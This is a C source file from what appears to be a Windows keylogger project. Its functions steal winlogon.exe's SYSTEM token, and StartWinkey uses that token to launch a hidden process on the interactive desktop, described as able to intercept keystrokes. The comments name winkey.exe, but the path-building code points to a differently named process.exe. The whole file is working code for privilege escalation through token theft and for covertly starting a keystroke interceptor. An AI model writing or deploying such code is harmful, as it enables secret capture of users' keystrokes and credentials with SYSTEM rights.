/**
 * @file winkey.c
 * @brief Implementation of process management functions specifically for winkey.exe.
 */

#include "tinky.h"

/**
 * @brief Constructs the absolute path to the "winkey.exe" file based on the service's current location.
 * 
 * Takes the current service binary location, strips the filename and one parent directory, 
 * then appends "\winkey\winkey.exe".
 * 
 * @param outPath Buffer to store the constructed path.
 * @param outSize Size of the destination buffer.
 */
void BuildWinkeyPath(char *outPath, DWORD outSize)
{
	char exePath[MAX_PATH];
	char *lastSlash, *parentSlash;

	if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
		outPath[0] = '\0';
		return;
	}

	lastSlash = strrchr(exePath, '\\');
	if (lastSlash) *lastSlash = '\0';

	parentSlash = strrchr(exePath, '\\');
	if (parentSlash) *parentSlash = '\0';

	_snprintf_s(outPath, outSize, _TRUNCATE, "%s\\winkey\\process\\process.exe", exePath);
	outPath[outSize - 1] = '\0';
}

/**
 * @brief Spawns "winkey.exe" under Session 1 with SYSTEM privileges.
 * 
 * Ensures single-instance execution via a global mutex. Leverages a stolen winlogon.exe
 * token to spawn winkey.exe as SYSTEM in the interactive user session (Session 1), 
 * rendering it visible / capable of intercepting keystrokes.
 * 
 * @return BOOL TRUE if the process was successfully launched, FALSE otherwise.
 */
BOOL StartWinkey(void)
{
	BOOL launched = FALSE;
	
	EnterCriticalSection(&g_ProcLock);

	/* ---- single-instance guard ---- */
	g_SingleInstanceMutex = CreateMutexA(NULL, TRUE, SINGLE_INSTANCE_MUTEX);
	if (!g_SingleInstanceMutex) {
		OutputDebugStringA("CreateMutex failed");
		LeaveCriticalSection(&g_ProcLock);
		return FALSE;
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		OutputDebugStringA("winkey.exe already running - skipping launch");
		CloseHandle(g_SingleInstanceMutex);
		g_SingleInstanceMutex = NULL;
		LeaveCriticalSection(&g_ProcLock);
		return FALSE;
	}

	/* ---- enable privileges before token operations ---- */
	if (!EnableRequiredPrivileges()) {
		OutputDebugStringA("Failed to enable required privileges");
		CloseHandle(g_SingleInstanceMutex);
		g_SingleInstanceMutex = NULL;
		LeaveCriticalSection(&g_ProcLock);
		return FALSE;
	}

	/* ---- steal winlogon.exe's SYSTEM token ---- */
	HANDLE hDupToken = StealWinlogonToken();
	if (!hDupToken) {
		CloseHandle(g_SingleInstanceMutex);
		g_SingleInstanceMutex = NULL;
		LeaveCriticalSection(&g_ProcLock);
		return FALSE;
	}

	/* ---- build the target path ---- */
	char appPath[MAX_PATH];
	BuildWinkeyPath(appPath, MAX_PATH);

	/* ---- launch winkey.exe as SYSTEM on the interactive desktop ---- */
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb        = sizeof(si);
	si.lpDesktop = "winsta0\\default"; /* attach to the visible desktop */

	ZeroMemory(&g_WinkeyProcInfo, sizeof(g_WinkeyProcInfo));

	char appDir[MAX_PATH];
	strcpy(appDir, appPath);
	char *last = strrchr(appDir, '\\');
	if (last)
		*last = '\0';
	if (CreateProcessAsUserA(
			hDupToken,
			appPath,
			NULL,
			NULL, NULL, FALSE,
			CREATE_NO_WINDOW,
			NULL,
			appDir,
			&si,
			&g_WinkeyProcInfo))
	{
		launched = TRUE;
	} else {
		printf("CreateProcessAsUser failed (%lu)\n", (unsigned long)GetLastError());
		CloseHandle(g_SingleInstanceMutex);
		g_SingleInstanceMutex = NULL;
	}

	CloseHandle(hDupToken);
	LeaveCriticalSection(&g_ProcLock);
	return launched;
}

/**
 * @brief Gracefully terminates the running "winkey.exe" process and releases its associated mutex.
 * 
 * Safely kills the child process via TerminateProcess, waits for shutdown, closes handles,
 * and releases the singleton mutex.
 */
void StopWinkey(void)
{
	EnterCriticalSection(&g_ProcLock);

	if (g_WinkeyProcInfo.hProcess) {
		TerminateProcess(g_WinkeyProcInfo.hProcess, 0);
		WaitForSingleObject(g_WinkeyProcInfo.hProcess, 5000);
		CloseHandle(g_WinkeyProcInfo.hProcess);
		CloseHandle(g_WinkeyProcInfo.hThread);
		ZeroMemory(&g_WinkeyProcInfo, sizeof(g_WinkeyProcInfo));
	}

	if (g_SingleInstanceMutex) {
		ReleaseMutex(g_SingleInstanceMutex);
		CloseHandle(g_SingleInstanceMutex);
		g_SingleInstanceMutex = NULL;
	}

	LeaveCriticalSection(&g_ProcLock);
}
